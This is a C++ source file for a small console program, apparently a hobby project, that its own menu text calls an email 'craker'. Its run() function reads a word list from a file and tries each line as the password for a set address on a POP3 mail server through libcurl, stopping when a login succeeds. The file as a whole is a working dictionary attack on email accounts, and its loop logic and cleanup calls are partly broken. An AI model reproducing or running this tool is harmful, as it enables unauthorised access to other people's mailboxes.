#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include<iostream>
#include<fstream>
#include<vector>
#define TRUE 1
#define FALSE 0
using namespace std;
struct data {
	string from = { "3zubr@wp.pl" };
string server = { "pop3://pop3.wp.pl" };
string passwd;
		fstream infile;
}data;


class thc {
	public:
	/*konstruct*/
thc() {
		bool done=false;
		load_data();
		menu(done);	
	
}
~thc() {
				curl_easy_cleanup(curl);
				curl=NULL;
}
private:

CURL *curl = curl_easy_init();
CURLcode res = CURLE_OK;
int load_data()
{
	string buff;

	data.infile.open("src/conf.txt");
		if (!data.infile)
		return 0;
		data.infile>>data.from;
		data.infile>>data.server;
	data.infile.close();	
}
int man()
{
	vector < string > v1(4);
	v1.push_back("`   notepadpl.blogspot.com                            ");
	v1.push_back("`    program thc craker email olny for email  ");
	v1.push_back("`                                  ");
	v1.push_back("`                                   ");
	v1.push_back("`                                  ");
	v1.push_back("`                                   ");
	v1.push_back("`                                  ");
	v1.push_back("`                                   ");
	v1.push_back("`                                  ");
	v1.push_back("`                                   ");
	v1.push_back("`                THC	PROGRAM   TYPe               ");
	v1.push_back("`                                   ");
	v1.push_back("`                      MENU TYPE            ");
	v1.push_back("`                                Demo              ");
	v1.push_back("`      1.run                            ");
	v1.push_back("`       2.configure                        ");
	v1.push_back("`                                  ");
	v1.push_back("`                                   ");
	v1.push_back("`                                  ");
	v1.push_back("`                                   ");
	for (int i = 0; i < v1.size(); i++)
		cout << v1[i] << endl;
}

int configure()
{
	vector < string > v1(4);
	v1.push_back("      ");
	v1.push_back("  1. enter new server    ");
	v1.push_back("  2. enter new adres    ");
		v1.push_back("  k - exit    ");
	v1.push_back("   server:   ");
	v1.push_back(data.server);
	v1.push_back("     adres ");
	v1.push_back(data.from);
	v1.push_back("      ");
	v1.push_back("    ps. change src/conf.txt to save   ");
	v1.push_back("      ");
	for (int i = 0; i < v1.size(); i++)
		cout << v1[i] << endl;
}

int run()
{
	string buff;
	ifstream infile;
	infile.open("src/plik.txt");
	if (!infile)
		return 0;
	do
	{
		while (!infile.eof())
		{
			buff.clear();
			getline(infile, buff);
			// infile>>buff;
			cout << buff << endl;
			cout << "serwer" << data.server << endl;
			cout << "from" << data.from << endl;
			if (curl)
			{
				// printf(buff);
				curl_easy_setopt(curl, CURLOPT_URL, data.server.c_str());
				curl_easy_setopt(curl, CURLOPT_USERNAME, data.from.c_str());
				curl_easy_setopt(curl, CURLOPT_PASSWORD, buff.c_str());
				// curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
				// curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
				// curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
				// curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
				res = curl_easy_perform(curl);
				printf(buff.c_str());
				if (res != CURLE_OK)
				{
					continue;
				curl_easy_cleanup(curl);
				}
				else
				{
					break;
				}
				curl_easy_cleanup(curl); /*not remowed i dont now why*/
			}
		}
	}
	while (CURLE_OK);
	infile.close();
}

int conf()
{
	char key;
	do
	{
		configure();
		cin >> key;
		switch (key)
		{
		case 27:
			key = false;
			break;
		case '1':
			cout << "enter new walue:" << endl;
			cin >> data.server;
			break;
		case '2':
			cout << "enter new walue:" << endl;
			cin >> data.from;
			break;
		case '0':
			cout << "return" << endl;
			break;
		case '4':
			break;
		case '5':
			break;
		}
	}
	while (key != 'k');
}

 int menu(bool done)
{
	char key;
	man();
	cin >> key;
	switch (key)
	{
	case 27:
		done = true;
		break;
	case '1':
		run();
		break;
	case '2':
		conf();
		break;
	case '3':
		break;
	case '4':
		break;
	case '5':
		break;
	}
	if (!done)
	{
		return menu(done);
	}
	else
		return 1;
} 
};

int main(int argv, char **argc)
{
	/*chath alloc moloc */
thc *magic = new thc;
delete magic;
	return 0;
}